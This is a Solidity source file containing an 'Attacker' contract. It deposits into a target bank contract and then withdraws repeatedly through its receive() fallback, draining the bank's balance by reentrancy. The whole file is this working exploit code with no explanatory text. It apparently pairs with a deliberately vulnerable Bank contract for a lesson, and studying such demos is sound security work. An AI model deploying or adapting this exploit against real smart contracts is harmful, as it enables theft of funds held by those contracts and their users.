//SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

//import "./Bank.sol";

// alternatively, just create the interface
interface IBank {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker {
    //Bank private bankContract;
    IBank private bankContract;

    constructor(address bankContractAddress) {
        //bankContract = Bank(bankContractAddress);
        bankContract = IBank(bankContractAddress);
    }

    function attack() external payable {
        bankContract.deposit{value: msg.value}();
        bankContract.withdraw();
    }

    receive() external payable {
        if (address(bankContract).balance > 0) {
            bankContract.withdraw();
        }
    }
}
